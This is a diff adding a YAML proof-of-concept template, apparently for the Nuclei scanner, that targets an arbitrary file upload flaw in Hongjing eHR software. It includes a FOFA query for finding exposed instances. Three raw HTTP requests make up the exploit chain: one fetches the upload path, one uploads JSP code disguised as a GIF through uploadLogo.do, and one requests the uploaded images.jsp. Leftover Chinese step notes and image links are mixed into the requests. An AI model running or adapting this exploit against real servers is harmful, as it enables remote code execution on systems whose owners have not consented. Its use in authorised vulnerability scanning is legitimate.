@@ -1,0 +1,115 @@
+id: poc-yl80wz0m5xsct68g
+info:
+  name: 宏景eHR uploadLogo存在任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/yl80wz0m5xsct68g'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: yl80wz0m5xsct68g
+    fofa: app="HJSOFT-HCM"
+http:
+- raw:
+  - 'GET /module/system/qrcard/mobilewrite/qrcardmain.jsp HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Cache-Control: max-age=0
+
+    Upgrade-Insecure-Requests: 1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate, br
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Connection: close
+
+    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1731289061524-9b83861e-842a-4de8-83e0-b5ef84c56911.png)
+
+    2.获取上传路径'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'POST /sys/cms/uploadLogo.do?b_upload=upload&isClose=2&type=1 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
+
+    Cookie: JSESSIONID=5E5C59903D3719E0E366729B46EAF77D;
+
+    Content-Type:multipart/form-data; boundary=----WebKitFormBoundaryfjKBvGWJbG07Z02r
+
+    Content-Length: 522
+
+    ------WebKitFormBoundaryfjKBvGWJbG07Z02r
+
+    Content-Disposition: form-data; name="path"
+
+    ------WebKitFormBoundaryfjKBvGWJbG07Z02r
+
+    Content-Disposition: form-data; name="lfType"
+
+    0
+
+    ------WebKitFormBoundaryfjKBvGWJbG07Z02r
+
+    Content-Disposition: form-data; name="logofile"; filename=""
+
+    Content-Type: image/gif
+
+    <%= "123456" %>
+
+    ------WebKitFormBoundaryfjKBvGWJbG07Z02r
+
+    Content-Disposition: form-data; name="twoFile"; filename=""
+
+    Content-Type: image/gif
+
+    <%= "123456" %>
+
+    ------WebKitFormBoundaryfjKBvGWJbG07Z02r--
+
+    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1731289061815-5d97d57f-89ab-4e72-997d-d9ab725312f1.png)
+
+    3.替换获取的路径请求上传'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /images.jsp HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Cache-Control: max-age=0
+
+    Upgrade-Insecure-Requests: 1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Referer: [https://fofa.info/](https://fofa.info/)
+
+    Accept-Encoding: gzip, deflate, br
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Connection: close
+
+    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1731289062430-db4dd04b-7c50-42b7-bb0a-82b22357e06d.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
